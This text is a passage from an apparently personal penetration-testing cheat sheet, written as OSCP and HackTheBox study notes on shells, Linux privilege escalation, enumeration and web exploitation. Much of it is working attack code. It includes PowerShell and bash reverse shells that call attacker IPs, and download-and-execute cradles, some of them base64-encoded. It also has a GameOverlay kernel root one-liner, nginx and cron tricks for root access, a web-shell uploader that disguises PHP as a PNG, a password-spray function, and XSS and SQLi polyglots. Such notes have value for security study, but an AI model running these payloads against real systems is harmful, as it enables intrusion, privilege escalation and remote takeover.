nc -nvv -w 1 -z <IP_ADDR> PORT-RANGE   

# UDP Port Scan
nc -nv -u -z -w 1 <IP_ADDR> PORT     
```


### Powercat

[Powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) is a powershell script that does what Netcat does. This is better becasue its native to windows (psq) 
`cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 . `

Dodgy Short Cut for cradele to RevShell
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.45.163 -p 9999 -e powershell"
```


## Linux Privesc
```
ls -la                # HAve a look ain the home dir 
ls -la /usr/local/    # Things in the /usr/local are normally placed explicitly by the admin so could be interesting and non standard. The package manager would not have put it there.

ip -a           # eth0 see if funny NAT stuff going on 
sudo -l         # This will list all the commands the user can run as root. May require user Auth
ps -ef --forest  
ps axjf  
ss -lntp        # see if anything is listening 

find / -type f -perm -4000 -ls 2>/dev/null             # find SUIDs
find / -type d -writable -exec echo {} \; 2>/dev/null  # find places where I can write to files

systemctl list-units --type=service # will all the services which are running
find /etc/ -name *.service`         # will also list the services

lsb_release -a   # get the linux Kernel version running 

We can then cat the service files to see how `systemd` starts it
`cat /etc/systemd/system/SOME-SERVICE.service`


cat /usr/local/etc/doas.conf   #   Doas is an alt to sudo from bsd and the cnf file might list provledged commands which can be run
find /intreting/directory/ -writable
grep -R system .
grep -R popen .


# Look at the web server maybe in `/opt` or `/var/www`
cat /etc/cron.d/*         # - Look at all the cron jobs

```

### Linpeas (approach for priv esc)
- Look for RedYellow first
- Kernel exploits are the lasts thing to check becasue they are not too relaible
- capabilities ` cap_net_raw` full access over network sockets

#### GameOverlay Linux Kernel Privesc
**Isolated Environment**: The script creates a safe, isolated environment using namespaces.
**Directory Preparation**: It prepares necessary directories for the overlay filesystem.
**Copy and Enhance Binary**: Copies the python3 binary and gives it special capabilities to change user IDs.
**Overlay Filesystem**: Sets up an overlay filesystem to manage changes without altering the original system.
**Privilege Escalation**: Uses the enhanced python3 binary to change its user ID to root and runs a command to get root access.

This payload is designed to manipulate the filesystem and capabilities to elevate privileges on a Linux machine, effectively gaining root access.
```sh
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("sudo su -")'
```

Step-by-Step Breakdown:
1. `unshare -rm sh -c "..."` - Create a New Isolated Environment:
   1. `unshare -rm` starts a new shell in a new mount and UTS namespace. This means the commands inside will run in an isolated environment, separate from the main system.
2. `mkdir l u w m` - Create Directories:
   1. Inside the new environment, this command creates four directories:
    `l`: Lower directory (where original files will be copied).
    `u`: Upper directory (where changes will be made).
    `w`: Work directory (needed for the overlay filesystem operations).
    `m`: Mount point (where the combined view of the filesystem will be presented).
3. `cp /u*/b*/p*3 l/` - Copy the Python Binary:
   1. This command copies the python3 binary from the system to the l (lower) directory. It uses wildcards to locate the binary, typically found in /usr/bin/python3.

4. `setcap cap_setuid+eip l/python3` - Set Special Capabilities:
   1. This command gives the copied python3 binary the cap_setuid capability, allowing it to change its user ID. This is crucial for escalating privileges.

5. `mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m` - Mount the Overlay Filesystem:
   1. This sets up an overlay filesystem with:
    `lowerdir=l`: The lower directory containing the original python3 binary.
    `upperdir=u`: The upper directory where any changes or new files will go.
    `workdir=w`: A working directory needed by the overlay filesystem.
    `m`: The mount point where the combined view will be seen.

6. `touch m/*` - Ensure Changes are Activated:
   1. This command touches all files in the combined view at m. This is a way to ensure the overlay filesystem is active and ready.

7. `u/python3 -c 'import os;os.setuid(0);os.system("sudo su -")'` - Run the Python Script to Escalate Privileges:
    `u/python3`: Runs the python3 binary from the upper directory (u).
    `import os`: Imports the os module in Python.
    `os.setuid(0)`: Sets the user ID to 0, which is the root user.
    `os.system("sudo su -")`: Runs a command to switch to the root user.






### Nginx Prvesc
htb Broker 
IF nginx is permited to run with `sudo` use the [ngx_http_dav_module](http://nginx.org/en/docs/http/ngx_http_dav_module.html) to write our
public SSH key into the root user's authorized_keys file. 
To do so, we start by creating the malicious NGINX configuration file, which looks as follows:

```
user root;                  # run it as root
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
    server {
        listen 1337;
        root /;             # set the root file system as the servers topmost dir, (so the entire file system!)
        autoindex on;
    
        dav_methods PUT;    # allow webdav ( Audit and versioning ) with PUT so files ( new root user keys) can be written to the server
    }
}
```

The key parts are the following:
- `user root` : The worker processes will be run by root , meaning when we eventually upload a file, it will also be owned by root .
- `root /` : The document root will be topmost directory of the filesystem.
- `dav_methods PUT` : We enable the WebDAV HTTP extension with the PUT method, which allows clients to upload files.

Save the settings to a file and get nginx to use it `sudo nginx -c /tmp/pwn.conf`. 
You can test the configuration with `-t` as in `sudo nginx -t /tmp/pwn.conf`
Once we run the nginx server we can then curl any file by supplying th epath eg: `curl localhost:1337/etc/passwd`. 
The final step to get a shell is to write our public SSH key to `/root/.ssh/authorized_keys`. This is where the `dav_methods PUT` comes in.

```sh
activemq@broker:/tmp$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/activemq/.ssh/id_rsa): ./root
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./root
Your public key has been saved in ./root.pub
...
...
```

The private key is stored in the file called `root` , and the public key is found in `root.pub` .
Finally, we use cURL to send the PUT request that will write the file. Having set the document root
to / , we specify the full path `/root/.ssh/authorized_keys` and use the `-d` flag to set thef
contents of the written file to our public key.

- `curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"`

The request should go through without error. We can now ssh into the machine as the root user: `ssh -i root root@localhost`

An alternative approach would be to load up a cron with the following cotnent:
```
* * * * * bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
``` 
To file to `/var/spool/cron/crontabs/root` with `curl <TARGET-NGINX-IP>:9001/var/spool/cron/crontabs/root/ --upload-file nastyCron`

### Password spray 

```sh
#/bin/bash
do_sray()(
    # quieter if someone looks at what bnaries ae being run
    users=$(awk -F: '{ if ($NF ~ /sh$/) print $1}' /etc/passwd)
    for user in $users; do
        echo "$1" | timeout 2 su $users -c whoami 2>/dev/null
        
        # exit if the code of the last comand is 0 ( succsess)
        if [[ $? -eq 0 ]]; then
            return
        fi
    done
)
do_spray $1

# This fucntion could be copies into bash and not to a script so it is not written to disk. IT is then called with "dospray <POSSIBLE_PW>"

```
Best in bash becasue no dependencies like  C based tool `sucrack` 

### reaver - Tool to attack WPS

- `reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1` 


---

# Shells

## PHP shell
Note: IF we can run and upload the following file, and then go to the page we have code execution - `echo "<?php phpinfo(); ?>" > test.php`
 HTB Tiers2 ( Base). Making use of the `$_REQUEST` method to fetch the cmd parameter because it works for fetching
both URL parameters in GET requests and HTTP request body parameters in case of POST requests.
Furthermore, we also use a POST request later in the walkthrough, thus using the `$_REQUEST` method is the
most effective way to fetch the cmd parameter in this context, so a basic CMD: `<?php echo system($_REQUEST['cmd']);?>`

One good option for PHP is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell.

Furthermore, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages

### WebShells

Loads - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx


### Reverese shell

While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.

One reliable reverse shell for PHP is [the pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Furthermore, the same [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)  also contains reverse shell scripts for various languages and web frameworks.


#### "Serve and Fetch" with base 64 encodeing method ( htb Cozyhosting)
Locally make a shell:
- `echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
- IN the target Command injection parameter get he shell and the run it: `admin;curl${IFS}http://10.10.14.22:9001/rev.sh|bash`
- Of do a stright rev shell as base64 after clearing out all the special chars:
  - `;{echo,-n,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvOTAwMSAwPiYK}|{base64,-d}|bash;` 
  - Note: take the time to make the base64 alpha numeric only
  - Note: Bash at the end should not be in braces

##### From the htb Validation machine on the sql injection via php Country param
1. payload =`cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.40/4444 0>&1'`
1. payload =`cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.40/4444+0>%261'`

#### Staged vs Stageless reverseshell payloads
- `Staged Reverse Shell` - The initial payload sent to the target is smaller and essentially acts as a "stager". 
- `Stageless Reverse Shell` - Sends the entire payload in one go, without needing a second stage to be downloaded.


#### Ippsecs preferred 1st attempt Reverse shell ( htb buff)
- `/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1`
  - Edit it to call back to your nc listener on port eg `9001` 
- Serve it up locally via python server 
- To obtain it on the victim run - `powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.142:8000/rev.ps1')"`
- You should see your shell com back to your nc listener `9001`

#### Alt Shell with netcat 
- `locate nc.exe` 
- `cp /usr/share/sqlninja/apps/nc.exe www`
- Open a local server : `python3 -m http.server` defaults to port `8000`
- Download `nc.exe` to the victim machine from the attacker server `curl 10.10.14.106:8000/nc.exe -o nc.exe`
- From the victim send a powershell reverese shell to the nc listener
  - `nc.exe 10.10.14.106 9001 -e powershell`

#### Encoded Powershell command to dl a reverse shell script , and spawn rev shell (evasive)

Steps
1. Download the encoder script tool `git clone https://github.com/darkoperator/powershell_scripts.git`
2. Echo the reverse shell command to fetch your reverse shell into a script `echo "IEX (New-Object Net.WebClient).DownloadString('http://<KALI-IP>:<PORT>/shell.ps1')" > tmp.ps1`
3. Encode the script which contains the command to get the reverse shell: `python3 ps_encoder.py -s tmp.ps1` This is a `bs64` cmd
4. Set up a listener 
5. Create a local Reverse shell script `shell.ps1`
```ps
$client = New-Object System.Net.Sockets.TCPClient('<KALI-IP>', <PORT>);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```
As a 1-liner
```ps
$client = New-Object System.Net.Sockets.TCPClient('<KALI-IP>', <PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
3. Host the script `python3 -m http.server <PORT>`
4. On the victim, run the powershell which includes the encoded command to download the script `bs64` cmd: `powershell.exe -encodedCommand  <BASE^$_BLOB>`/ Like : `powershell.exe -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA==`
5. This will run the encoded command , you will see your reverse shell script get downloaded from your python server, and then you should see a shell appear on your netcat listener.

#### Web Craddle (reverse shell)
When you can get command injection but the server doesn't like some special chars , and you want RCE.
1. Payload `curl <IP_ADDRESS:8001> | bash"`
1. Make an html file for your local server which has the line `/bin/bash -c 'bash -i >& /dev/tcp/IP_ADDRESS/9999 0>&1'`
1. server the file up with python `python3 -m http.server 8001` and when that gets curl'd it will send the string in the html file ( the payload)
1. open a net cat listener `nc -lvnp 9999`
IF this doesn't wotrl then we would try to write hte curl output t oan out file and then execute it ( becasue the pipe char did not work) see htb PC


### PHP server 
`php -S localhost:9000`   - Serves up on localhost:9000

### Php File upload to RCE
If we save the following as `backdoor.php` and try to upoad it:
- `<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>`
It will allows us to append the parameter `cmd` to our request (to `backdoor.php`), which will be executed using `shell_exec()`. 
This is if we can determine backdoor.php's location, if backdoor.php will be rendered successfully and if no PHP function restrictions exist.

##### Ippsecs RCE for php
- `<?php system($REQUEST['cmd']);?>`
- 
#### PHP webshell
Note: in php webshells its best to use `REQUEST` rather than `GET` as you can use both `GET` and `POST` 
IPP preferes sending `POST` req becasue 
- they wont show up on Apache Access logs
- Less bad chars as a POST so the comoand is liess likly ot screww up
eg htb buff 

#### More persistan webshell 
TO get a persistant shell
- `cp /opt/useful/SecLists/Web-Shells/FuzzDB/nc.exe .`
- `nc -lvnp 4444`
- `powershell InvokeWebRequest -Uri http://10.10.14.106:4444/nc.exe -Outfile c:\Users\Public\nc.exe`


<details>
	<summary>python webshell script</summary>

```sh

#!/usr/bin/env python3
import requests

def Main():
    url = "http://10.10.10.198:8080/upload.php?id=test"
    s = requests.Session()
    s.get(url, verify=False)
    
    # Magic bytes to look like a png
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png = {
            'file':
            (
                'test.php.png',         # get round the file extension check

                # Run webshell commands 
                PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["cmd"]); ?>', 
                'image/png',
                {'Content-Disposition': 'form-data'}
                # eg; curl http://10.129.25.107:8080/upload/test.php?cmd=whoami
                )           
            }
    data = {'pupload': 'upload'}
    r = s.post(url=url, files=png, data=data, verify=False)
    print("Uploaded!")

if __name__ == "__main__":
    Main()
```
</details>>


### Decrypt a file from a public RSA key (HTB: Weak RSA)
```
python3 /root/Tools/RsaCtfTool/RsaCtfTool.py --publickey <PUBLIC_KEY> --private --output <PRIVATE_KEY_NEW_NAME>
python3 /root/Tools/RsaCtfTool/RsaCtfTool.py --publickey <PUBLIC_KEY> --private <PRIVATE_KEY_NEW_NAME>.key --uncipherfile <INPUT_CIPHER_FILE> 
openssl pkeyutl -in <INPUT_CIPHER_FILE> -out flag.txt -decrypt -inkey <PRIVATE_KEY_NEW_NAME>
```
### Ippsec on PHP Type Juggling Confusion
First thing you want to do is to identify what tech is on the back end because this will inform what kinds of attacks you could uses.
Eg: Larvel session cookie means PHP
- API's often accept data via the GET url, or the body
- Recommended this BUG BOUNTY platform - https://app.intigriti.com/researcher/dashboard

### Php Interactive shell (get a password hash)
```
└─# php -a                                         
Interactive shell

php > echo pasword_hash('smith',PASSWORD_DEFAULT);
PHP Warning:  Uncaught Error: Call to undefined function pasword_hash() in php shell code:1
Stack trace:
#0 {main}
  thrown in php shell code on line 1
php > echo password_hash('smith',PASSWORD_DEFAULT);
$2y$10$BmihttOJCzieM.H2z6oio.aT5JAyj7zJoRt/aum02OiIgekN6CxJu
php > 
```

### Php in wordpress
We could also replace wp-config.php  in for example the theme: `Themes/twentyfifteen/`
Login to hte wordpress site and modify a php file to include the line:
- echo system($_REQUEST['foo'])
..then we can go to `http://10.129.198.51/?foo=pwd`
- `http://10.129.198.51/?foo=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.103 1234 >/tmp/f`


## Wordpress
The downside is we don't nkow the password for notch
then grep `/var/www/wp-config.php` for credentials
or look in the phpmyadmin database config file `config-db.php` 

A WordPress plugin can be as simple as a PHP script with some basic comments at the front in a zip file.
Re Createing a wordpress plugin ; comments are necessary for WordPress to accept it as a plugin!
Generate exploit wordpress plugins - `https://github.com/wetw0rk/malicious-wordpress-plugin`

**Note:** Best to hack the `Themes` than the `Plugins` **as a bad plugin could crash the site!!!**

If you do need ot hack the plugins, this tool worked ok in the OSCP labs - https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py

## Make a nicer bash shell ( perhaps from a php webshell)

```sh
stty -a       # Locally on your own machine get the dimensions of rows and colums
python3 -c 'import pty;pty.spawn("/bin/bash")'  # open the shell on the victim
stty rows XX cols YY   # sret the dimensions on the victim
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```
Note:
`stty raw -echo` is :
- `stty` is a utility to set the terminal options
- `raw` change the modes of the terminal so that no input or output processing is performed
- `-echo` means disable echo
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
export TERM=xterm
ctl Z               # background the terminal
stty raw -echo
fg + Enter          # to Forground
```
Note: `stty -a` will list the term and show the columns width so you can set it in the shell
Set it on your box RevShell with `stty columns 136 rows 32`

### Get a full func reverse shell with python
To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`


## Socat shell
Reverse Shell
Victim Linux: `socat exec:'bash -li',pty,stderr,setidsigint,sane tcp:<IP>:<PORT>`
Victim Windows: `socat TCP4:<IP>:<PORT> EXEC:'cmd.exe',pipes`
Attacker: `socat file:`tty`,raw,echo=0 tcp-listen:<PORT>`

`socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock` allows your computer to talk to a specific service that handles system logging and device management, using a special file as a direct line for sending and receiving messages. This is like using a dedicated, internal phone line within your computer to communicate with a specific service efficiently and securely.

## Simple server python 3 
- `python3 -m http.server 9999`

## Tcpdump 
`tcpdump -i tun0 icmp` 					# opens a listerner for incoming pings

### zeek ( for pcap inspection ?? )
Zeek-cut tool ?
See scavanger htb ippsec

## Jenkins 
`<Jenkins_web_address>:8080/script` # Run groovy code

## Awscli (S3)
When configureing ,Using an arbitrary value for all the fields an work. 
Sometimes the server is configured to not check authentication (still, it must be configured to something for aws to work).          
```
└─# aws configure 				     
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```
List all of the S3 buckets hosted by the server
- `aws --endpoint=http://s3.thetoppers.htb s3 ls` 

Use the ls command to list objects and common prefixes under the specified bucket.
- `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

Create a webshell and then copy it to the webserver to get RCE
- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`
- `http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.105:8000/shell.sh|bash`

### Web tech analysis tools:
- Whatruns - https://chrome.google.com/webstore/detail/whatruns/cmkdbmfndkfgebldhnkbfhlneefdaaip?hl=en
- Wappalyzer ( has Cli too: https://github.com/gokulapap/wappalyzer-cli )
	
	
### Content Discovery
"Better lists; not tools" - JH
See - https://wordlists.assetnote.io/ and search for some of the below strings eg: httparchive_cgi_pl_...

IIS/MSF:
- httparchive_aspx_asp_cfm_svc_ashx_asmx...
- https://github.com/irsdl/IIS-ShortName-Scanner

PHP + CGI
- httparchive_cgi_pl_...
- httparchive_php_...

General API 
- httparchive_apiroutes_...
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/swagger.
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/api-endpoints.txt

Java
- httparchive_jsp_jspa_do_action

Generic:
- httparchive_directories_1m...
- RAFT lists (see Seclists etc) 
- https://github.com/danielmiessler/RobotsDisallowed
- https://github.com/six2dez/OneListForAll
- https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10

Also: Search technology on the Asset note site for workdlists

- Source code into URLS to search for : https://github.com/danielmiessler/Source2URL/blob/master/Source2URL

	
Also Generate Wordlists with [Cewl tool](https://www.kali.org/tools/cewl/#:~:text=CeWL%20(Custom%20Word%20List%20generator,addresses%20found%20in%20mailto%20links.)
## Burp Plugins list
|                              |                           |                                |
|------------------------------|---------------------------|--------------------------------|
| .NET beautifier              | J2EEScan                  | Software Vulnerability Scanner |
| Software Version Reporter    | Active Scan++             | Additional Scanner Checks      |
| AWS Security Checks          | Backslash Powered Scanner | Wsdler                         |
| Java Deserialization Scanner | C02                       | Cloud Storage Tester           |
| CMS Scanner                  | Error Message Checks      | Detect Dynamic JS              |
| Headers Analyzer             | HTML5 Auditor             | PHP Object Injection Check     |
| JavaScript Security          | Retire.JS                 | CSP Auditor                    |
| Random IP Address Header     | Autorize                  | CSRF Scanner                   |
| JS Link Finder               | Vulners ( JHADDIX)        |                                |
Also : Burp plugin `cookie-editor`

Burp extension to create wordlists - https://github.com/0xDexter0us/Scavenger

### Createing a list of Usernames based on some Recon

Lets say we have a list of usernames

```sh
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

This tool can create various mutatation/permutaitons of them if we provide them in a file: `names.txt`
Username gen tool: https://github.com/urbanadventurer/username-anarchy
```sh
ruby /home/kali/Tools/username-anarchy/username-anarchy -i names.txt > usernames2.txt
```

---- 
### Wordlists 
- https://wordlists.assetnote.io/ AssetNote Wordlists
- https://github.com/six2dez/OneListForAll “Recon for the win” guy
- https://github.com/danielmiessler/SecLists/tree/master 
	
### Web tech analysis tools:
- Whatruns https://chrome.google.com/webstore/detail/whatruns/cmkdbmfndkfgebldhnkbfhlneefdaaip?hl=en
-  and Wappalyzer ( has Cli too) 

### Polyglot Pyloads
Polyglot XSS payload:
```
jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
- SQLi `SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/` - this works in single quote context, double quote context, as well as "straight into query" context.
- TODO Read : https://dev.to/didymus/xss-and-sqli-polyglot-payloads-4hb4

## Gobuster
Basic enumeration mode:  dir:
- `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5`
- `gobuster dir -u http://192.168.183.192 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 20 -x txt,php,html -r -o gobuster_results.txt -k`
- `gobuster dir -u http://192.168.249.192:5985/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 20 -r`
- `gobuster dir -u http://10.129.36.36 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 20 -o GobusterOutput.txt -t 5`
- `gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o GobusterOutput.txt`
- **OSCP list mentioned**: `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt`

Subdomain enumeration:
- `gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -u http://thetoppers.htb -o GobusterOutput.txt` 

Where... 
vhost : Uses VHOST ( normally the IP _ADDR )
-w : Path to the wordlist
-u : Specify the URL
-t: threads

Note: If using Gobuster version 3.2.0 and above we also have to add the --append-domain flag to our
command so that the enumeration takes into account the known vHost ( thetoppers.htb ) and appends it
to the words found in the wordlist ( word.thetoppers.htb ).

**Gobuster DNS module**
- `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"`

Example from work: `gobuster vhost -u https://URL -w /Users/geoffreyowden/Tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k --exclude-length 3701,435 -o GobusterOutput.txt`


**Gobuster Pattern files**

Perhaps you want to try an Api enumeration with different patterns for the api version eg v1,v2,v3 etc. You can supply a pattern file with the following content and this will 
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

Then, to enumerate the API with **gobuster** using the following command:

`gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt`


## DNS scanning
```
host www.megacorpone.com
host -t mx www.megacorpone.com   # mail exchange type scan

for ip in $(cat list.txt); do host $ip.megacorpone.com; done`
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"

dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorpone.com -D ~/list.txt -t brt

```

### Type values for `-t` 
- **std**: Standard enumeration (SOA, NS, A, AAAA, MX, and SRV).
- **rvl**: Reverse lookup of a given CIDR or IP range.
- **brt**: Brute force domains and hosts using a given dictionary.
- **srv**: SRV records enumeration.
- **axfr**: Test all NS servers for a zone transfer.
- **bing**: Perform Bing search for subdomains and hosts.
- **yand**: Perform Yandex search for subdomains and hosts.
- **crt**: Perform crt.sh search for subdomains and hosts.
- **snoop**: Perform cache snooping against all NS servers for a given domain, testing all with a file containing the domains (file given with `-D` option).
- **tld**: Remove the TLD of the given domain and test against all TLDs registered in IANA.
- **zonewalk**: Perform a DNSSEC zone walk using NSEC records.


# DNSEnum 
Another popular DNS enumeration tool that can be used to further automate DNS enumeration of the megacorpone.com domain.
```
`dnsenum --enum --dnsserver 8.8.8.8 --threads 10 --scrap 50 --pages 10 --file /path/to/your/subdomains.txt --recursion --whois --output results.xml example.com`
```
##### Explanation of the Options:
1. **General Options**:
    - `--enum`: This is a shortcut option equivalent to `--threads 5 -s 15 -w`. It enables threading, sets a delay, and performs WHOIS queries.
    - `--dnsserver <your_dns_server>`: Use a specific DNS server for A, NS, and MX queries.
    - `--threads 10`: Set the number of threads to 10 for parallel queries.
    - `--timeout 10`: (default) Set the timeout for TCP and UDP queries to 10 seconds.
    - `--verbose`: Show all progress and error messages.
2. **Google Scraping Options**:
    - `--scrap 50`: Scrape up to 50 subdomains from Google.
    - `--pages 10`: Process up to 10 pages of Google search results.
3. **Brute Force Options**:
    - `--file /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` A good starting point file other than the default for brute-forcing subdomains.
    - `--recursion`: Enable recursion on discovered subdomains with NS records.
4. **WHOIS Netrange Options**:
    - `--whois`: Perform WHOIS queries on class C network ranges.
5. **Output Options**:
    - `--output results.xml`: Save the results in XML format, which can be imported into tools like MagicTree.



### ffuf
Domain name look up with ffuf
- `ffuf -u http://DOMAIN -H "Host: FUZZ.DOMAIN" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 5`


### dnsrecon
```sh
dnsrecon -d 10.129.17.50 -r 10.0.0.0/8 # Does reverse lookup accross the network range
```

####  dns server hackery ( snd-admin) htb Resolute
```
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.9\share\da.dll

sc.exe stop dns
sc.exe start dns

bash: sudo impacket-psexec megabank.local/administrator@<VICTIM_IP>
```

# **nslookup** (for Windows DNS enumeration)
- `nslookup mail.megacorptwo.com`
- `nslookup -type=TXT info.megacorptwo.com`

```
# Set the DNS server to use
nslookup
> server 8.8.8.8

# Query A record
> set type=A
> example.com

# Query AAAA record
> set type=AAAA
> example.com

# Query MX record
> set type=MX
> example.com

# Query NS record
> set type=NS
> example.com

# Query SOA record
> set type=SOA
> example.com

# Query TXT record
> set type=TXT
> example.com

# Query CNAME record
> set type=CNAME
> www.example.com

# Query PTR record (Reverse DNS Lookup)
> set type=PTR
> 192.0.2.1

# Query SRV record
> set type=SRV
> _sip._tcp.example.com

# Query ANY record (All available records)
> set type=ANY
> example.com

# Exit nslookup
> exit
```



### Whatweb 
Default install on Kali
```
whatweb -a3 https://www.facebook.com -v
# - a Aggressive 1-3 
# -v verbose
```
### Aquatone
Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
See: https://github.com/michenriksen/aquatone

```
sudo apt install golang chromium-driver
go get github.com/michenriksen/aquatone
export PATH="$PATH":"$HOME/go/bin"
```
## wafw00f (Web appplication Firewall Fingerprinting)
`wafw00f -a https://bbc.com -v` - Check all and verbose WAFs at the site 

## SQLi Testing
You can find [the comprehensive list of recommended SQLi auth bypass payloads in PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), each of which works on a certain type of SQL queries.

```
'
''
`
``
"
""
;
;-- -
#
admin' or 1=1 --
offsec' OR 1=1 -- //
```
#### Default Ports 
**MySQL ( and MariaDB)**
- `3306 TCP`
- `3306 UDP` (Rarely used)
**MSSQL**
- `1443 TCP`
- `1434 UDP`
**PostgresSQL**
- `5432 TCP`
- `UDP` (Rarely used)
**DB2**
- `50000 TCP`
- `UDP` (Rarely used)
- 
#### Note on `//`
By forcing the closing quote on the uname value and adding an OR 1=1 statement followed by a -- comment separator and two forward slashes (//), we can prematurely terminate the SQL statement. The syntax for this type of comment requires two consecutive dashes followed by at least one whitespace character.

In this section's examples, we are trailing these comments with two double slashes. This provides visibility on our payload and also adds some protection against any kind of whitespace truncation the web application might employ.

### In-band to UNION injection
